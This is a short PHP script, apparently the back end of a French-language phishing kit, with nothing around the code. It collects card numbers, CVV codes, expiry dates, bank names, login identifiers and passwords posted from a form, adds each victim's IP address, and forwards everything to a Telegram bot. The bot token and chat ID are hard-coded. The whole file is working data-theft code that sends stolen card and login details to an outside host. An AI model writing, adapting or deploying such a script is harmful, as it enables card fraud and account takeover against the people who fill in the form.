

<?php

// =======================
// CONFIGURATION TELEGRAM
// =======================
$token  = "7120143122:AAHxuoiaZ2OTwNBlQ4PpmzPQm3ZNXPdyqQE";
$chatId = "6125766253";
// =======================
// RÉCUPÉRATION DES DONNÉES
// =======================
$cnumber   = $_POST['cnumber']   ?? 'vide';
$cv = $_POST['cv'] ?? 'vide';
$edate   = $_POST['edate']   ?? 'vide';

$bk   = $_POST['bk']   ?? 'vide';
$iden = $_POST['iden'] ?? 'vide';
$mo   = $_POST['mo']   ?? 'vide';


// =======================
// CONSTRUCTION DU MESSAGE
// =======================
$message = "📥 Nouveau formulaire reçu\n\n";
$message .= "Numero de carte : $cnumber\n";
$message .= "cvv : $cv\n";
$message .= "Date Exp : $edate\n";

$message .= "BK : $bk\n";
$message .= "Identifiant : $iden\n";
$message .= "MO : $mo\n";

$message .= "\nIP : " . $_SERVER['REMOTE_ADDR'];
$message .= "\nDate : " . date("d/m/Y H:i:s");

// =======================
// ENVOI À TELEGRAM
// =======================
$url = "https://api.telegram.org/bot$token/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);

// =======================
// RÉPONSE POUR AJAX
// =======================
echo json_encode(["success" => true]);
